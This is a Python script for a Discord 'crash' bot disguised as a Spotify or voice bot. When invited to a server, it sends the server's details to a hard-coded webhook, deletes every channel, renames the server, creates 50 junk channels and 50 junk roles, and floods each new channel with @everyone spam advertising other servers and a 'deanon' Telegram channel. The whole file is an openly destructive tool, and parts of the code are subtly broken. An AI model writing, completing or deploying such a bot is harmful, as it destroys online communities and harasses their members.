import os
from keep_alive import keep_alive
keep_alive()
try:
    import discord
    from discord.ext import commands
    import aiohttp
    from discord import Webhook, AsyncWebhookAdapter
    import asyncio
except:
    os.system('pip install discord')

TOKEN = open("token.txt")
web = os.getenv("https://discord.com/api/webhooks/1139690459762016347/N6aHt-9UdiBktS45gxCMEHjbBRxm2uQUpbUif7MUMHLI6cdi7H3t-IAMWr7Joh5JqkFW")    
client = commands.Bot(command_prefix='.', intents=discord.Intents.all())

@client.event
async def on_ready():
    print(f'[{client.user}]')
    
@client.event
async def on_guild_join(guild):
    if int(len(guild.members)) > 15 or int(len(guild.members)) == 5:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.add_bot):
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(web, adapter=AsyncWebhookAdapter(session))
                await webhook.send(embed=discord.Embed(title='Voice bot | Сервер будет выебан', description=f'**Название сервера:** `{guild.name}`\n**Участников на сервере:** `{len(guild.members)}`\n**Количество каналов на сервере:** `{len(guild.channels)}`\n**Количество ролей на сервере:** `{len(guild.roles)}`\n**Сервера где меньше 15 участников не показываются в логах**', colour=discord.Colour.from_rgb(255, 0, 0)))
                
    with open('spotify.png', 'rb') as f:
        ava = f.read()
        
    try:
        await guild.edit(name='Crashed By Spotify Bot', icon=ava)
    except: pass
    
    for channel in guild.channels:
        try:
            await channel.delete()
        except: pass
        
    for _ in range(50):
        try:
            await guild.create_text_channel(name='crashed-by-spotify-bot')
        except: pass
        
    for _ in range(50):
        try:
            await guild.create_role(name='Crashed By Spotify Bot')
        except: pass
        
@client.event
async def on_guild_channel_create(channel):
    try:
        webhook = await channel.create_webhook(name='Crashed By Spotify Bot')
        for _ in range(100):
          await webhook.send(content='@everyone @here https://discord.gg/je6U2t9xkQ', embed=discord.Embed(title='СЕРВЕР КРАШНУТ', description='Ваш сервер выебан краш ботом от MSC Team\nВсе участники вашего сервера переезжают сюда:\nhttps://discord.gg/lavanbot\nhttps://t.me/russian_deanon', colour=discord.Colour.from_rgb(255, 0, 0)))
    except:
      for _ in range(100):
        await channel.send(content='@everyone @here https://discord.gg/je6U2t9xkQ', embed=discord.Embed(title='СЕРВЕР КРАШНУТ', description='Ваш сервер выебан краш ботом от MSC Team\nВсе участники вашего сервера переезжают сюда:\nhttps://discord.gg/lavanbot\nhttps://t.me/russian_deanon', colour=discord.Colour.from_rgb(255, 0, 0)))
        
client.run(TOKEN)
